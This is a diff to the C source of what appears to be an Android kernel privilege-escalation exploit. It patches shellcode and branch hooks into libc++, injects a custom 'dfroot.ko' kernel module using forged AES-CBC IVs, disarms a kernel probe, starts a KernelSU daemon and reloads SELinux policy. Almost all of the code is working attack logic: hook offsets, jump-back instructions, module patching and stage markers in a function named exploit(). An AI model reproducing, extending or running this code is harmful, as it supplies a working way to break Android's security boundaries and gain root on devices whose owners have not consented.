@@ -17,6 +17,8 @@
 #include <arpa/inet.h>
 #include "aes256.h"
 
+#define eos(s) (s + strlen(s))
+
 static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
 static char    *libcxx_ko_target;
 
@@ -25,6 +27,8 @@ static int      g_sender_port;
 static uint32_t g_spi;
 static uint8_t  g_aes_key[32];
 static uint32_t g_seq = 1;
+static uint64_t g_vr_off;
+static int      g_vr_auto;
 struct PatchRestore {
     const char *lib;
     uint64_t    tramp_aligned;
@@ -36,15 +40,6 @@ struct PatchRestore {
 };
 
 static struct PatchRestore g_libcxx_r;
-
-static void wait_for_bootstrap_cleanup(void)
-{
-    /* bootstrap removes the per-run markers after unloading dfroot. */
-    for (int i = 0; i < 500; i++) {
-        if (access("/dev/df", F_OK) != 0) return;
-        usleep(10000);
-    }
-}
 
 /* IV = AES256_ECB_DEC(key, old_content) XOR desired
  * When kernel CBC-decrypts: plaintext = AES_DEC(key, ciphertext) XOR IV
@@ -312,8 +307,30 @@ static int read_device_versions(int *andr, int *major, int *minor) {
     if (uname(&u) != 0) return -1;
     if (sscanf(u.release, "%d.%d", major, minor) != 2) return -1;
     const char *m = strstr(u.release, "android");
-    if (!m) return -1;
-    *andr = atoi(m + 7);
+    if (!m) {
+        /* Some vendor kernels drop the "androidNN" token from uname -r, which
+         * leaves nothing to parse here. ro.vendor.build.version.release carries
+         * the same number, so fall back to it - but the popen is untrusted: it
+         * can fail outright, and the property is neither guaranteed numeric nor
+         * short, so nothing is built until a leading integer has actually been
+         * read out of it. */
+        printf("uname -r is missing Android version, trying getprop\n");
+        char vendor_ver[16] = { 0 };
+        FILE *f = popen("getprop ro.vendor.build.version.release", "r");
+        if (f) {
+            if (!fgets(vendor_ver, sizeof(vendor_ver), f))
+                vendor_ver[0] = '\0';
+            pclose(f);
+        }
+        int prop = 0;
+        if (sscanf(vendor_ver, "%d", &prop) != 1 || prop <= 0) {
+            printf("getprop returned no usable Android version\n");
+            return -1;
+        }
+        *andr = prop;
+        return 0;
+    }
+    *andr = atoi(m + strlen("android"));
     return (*andr > 0) ? 0 : -1;
 }
 
@@ -367,6 +384,29 @@ static int patch_ko(void) {
     size_t len;
     char *buf = pad16(ko->start, (size_t)(ko->end - ko->start), &len);
     if (!buf) { printf("patch: %s - pad16 alloc failed\n", libcxx_ko_target); return -1; }
+
+    if (g_vr_off || g_vr_auto) {
+        static const unsigned char magic[8] =
+                { 0x16, 0xFF, 0xC0, 0xDF, 0x16, 0xFF, 0xC0, 0xDF };
+        int configured = 0;
+        for (size_t i = 0; i + 24 <= len; i++) {
+            if (memcmp(buf + i, magic, sizeof(magic)) != 0) continue;
+            uint64_t offset = g_vr_auto ? 0 : g_vr_off;
+            uint64_t automatic = g_vr_auto ? 1 : 0;
+            memcpy(buf + i + 8, &offset, sizeof(offset));
+            memcpy(buf + i + 16, &automatic, sizeof(automatic));
+            configured = 1;
+            printf("vr: config slot patched (%s)\n",
+                   g_vr_auto ? "running kernel BTF" : "provided funcs offset");
+            break;
+        }
+        if (!configured) {
+            printf("vr: ERROR - selected KMI module has no VR config slot; refusing to continue\n");
+            free(buf);
+            return 1;
+        }
+    }
+
     printf("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, len);
     int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);
     free(buf);
@@ -386,29 +426,14 @@ static void cleanup(void) {
 }
 
 int find_hook_target(const char *lib, const char *sym,
-                     uint64_t *hook, uint64_t *payload, uint32_t *first_insn);
+                     uint64_t *hook, uint64_t *payload, uint32_t *first_insn,
+                     size_t shellcode_size);
 
 static int patch_hook(const char *lib, const char *sym,
                       char *stage_data, uint32_t stage_len, char *stage_start,
                       char *first_inst_copy, struct PatchRestore *restore) {
-    uint64_t hook_off, shell_off; uint32_t first_insn;
-    printf("Finding symbol offsets for %s:\n", lib);
-    if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn)) {
-        printf("failed to find offsets for %s\n", lib); return 1;
-    }
-    printf("Found: hook=0x%lx shellcode=0x%lx len=%u\n", hook_off, shell_off, stage_len);
-
     const uint32_t BRANCH = 0x14000000;
     uint32_t start_delta = (uint32_t)(stage_start - stage_data);
-    uint32_t hook_insn = BRANCH | (((shell_off + start_delta - hook_off) >> 2) & 0x3ffffff);
-
-    if (first_insn == hook_insn) {
-        printf("%s already patched\n", lib); return 0;
-    }
-    uint32_t jmpback = BRANCH |
-        (((hook_off + 4) - (shell_off + stage_len - 4)) >> 2 & 0x3ffffff);
-    *(uint32_t *)&stage_data[stage_len - 4] = jmpback;
-    *(uint32_t *)&first_inst_copy[0] = first_insn;
 
     size_t padded; char *buf = pad16(stage_data, stage_len, &padded);
     if (!buf) { printf("patch: %s - pad16 alloc failed\n", lib); return -1; }
@@ -417,6 +442,23 @@ static int patch_hook(const char *lib, const char *sym,
         printf("shellcode too large to save (%zu)\n", padded);
         free(buf); return -1;
     }
+
+    uint64_t hook_off, shell_off; uint32_t first_insn;
+    printf("Finding symbol offsets for %s:\n", lib);
+    if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn, padded)) {
+        printf("failed to find offsets for %s\n", lib); free(buf); return 1;
+    }
+    printf("Found: hook=0x%lx shellcode=0x%lx len=%u\n", hook_off, shell_off, stage_len);
+
+    uint32_t hook_insn = BRANCH | (((shell_off + start_delta - hook_off) >> 2) & 0x3ffffff);
+
+    if (first_insn == hook_insn) {
+        printf("%s already patched\n", lib); free(buf); return 0;
+    }
+    uint32_t jmpback = BRANCH |
+        (((hook_off + 4) - (shell_off + stage_len - 4)) >> 2 & 0x3ffffff);
+    *(uint32_t *)&buf[stage_len - 4] = jmpback;
+    *(uint32_t *)&buf[first_inst_copy - stage_data] = first_insn;
 
     uint64_t aligned = hook_off & ~(uint64_t)15;
     int fd = open(lib, O_RDONLY);
@@ -485,7 +527,8 @@ static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
 
 static void usage(const char *argv0) {
     fprintf(stderr,
-            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX\n", argv0);
+            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX"
+            " [--vr-off N | --vr-auto]\n", argv0);
 }
 
 static int setup(int argc, char **argv) {
@@ -504,9 +547,14 @@ static int setup(int argc, char **argv) {
             spi = (uint32_t)strtoul(argv[++i], NULL, 0);
         else if (!strcmp(a, "--aes-key") && i + 1 < argc)
             have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;
+        else if (!strcmp(a, "--vr-off") && i + 1 < argc)
+            g_vr_off = strtoull(argv[++i], NULL, 0);
+        else if (!strcmp(a, "--vr-auto"))
+            g_vr_auto = 1;
         else { usage(argv[0]); return 2; }
     }
-    if (!encap_port || !sender_port || !spi || !have_aes) {
+    if (!encap_port || !sender_port || !spi || !have_aes ||
+            (g_vr_auto && g_vr_off) || g_vr_off > 0x100) {
         usage(argv[0]); return 2;
     }
 
@@ -515,6 +563,10 @@ static int setup(int argc, char **argv) {
     g_spi         = spi;
     g_seq         = 1;
     memcpy(g_aes_key, aes_key, 32);
+    if (g_vr_auto)
+        printf("vr funcs offset: auto-resolve from running kernel BTF\n");
+    else if (g_vr_off)
+        printf("vr funcs offset: %llu\n", (unsigned long long)g_vr_off);
 
     const char *ko_target = detect_ko_target();
     libcxx_ko_target = libcxx_data + libcxx_ko_target_off;
@@ -552,6 +604,10 @@ static int exploit(void) {
     } markers[] = {
         { "/dev/df",    "libc++: loading custom module",                    -1 },
         { "/dev/dfm0",  "kernel module: launching bootstrap",               -1 },
+        { "/dev/dfvr0", "vr: sys_exit probe disarmed (funcs = NULL)",       -1 },
+        { "/dev/dfvre", "vr: ERROR - probe disarm failed, aborting before manager", 4 },
+        { "/dev/dfvra", "vr: runtime BTF offset resolved",                  -1 },
+        { "/dev/dfvrx", "vr: ERROR - runtime BTF resolution failed, aborting before manager", 4 },
         { "/dev/dfm1",  "bootstrap: loading app preferences file",          -1 },
         { "/dev/dfme0", "bootstrap: ERROR - reading prefs failed",           1 },
         { "/dev/dfm2",  "bootstrap: cloning zygote env",                    -1 },
@@ -561,8 +617,10 @@ static int exploit(void) {
         { "/dev/dfm4",  "bootstrap: disabling ksu modules",                 -1 },
         { "/dev/dfme1", "bootstrap: ERROR - disable modules failed",         1 },
         { "/dev/dfm5",  "bootstrap: starting SU daemon",                    -1 },
-        { "/dev/dfm6",  "ksud start: SUCCESS",                               0 },
-        { "/dev/dfme2", "ksud start: ERROR - ksud nonzero exit",             1 },
+        { "/dev/dfm6",  "ksud late-load: SUCCESS",                         -1 },
+        { "/dev/dfme2", "ksud late-load: ERROR - ksud nonzero exit",         1 },
+        { "/dev/dfm7",  "SELinux policy reload: SUCCESS",                    0 },
+        { "/dev/dfme3", "WARNING - KernelSU active; SELinux policy reload failed", 0 },
     };
     int seen[sizeof(markers)/sizeof(markers[0])] = {0};
 
@@ -587,6 +645,5 @@ int main(int argc, char **argv) {
     if (setup(argc, argv) != 0) return 2;
     int rc = exploit();
     cleanup();
-    if (rc == 0 || rc == 1) wait_for_bootstrap_cleanup();
     return rc;
 }
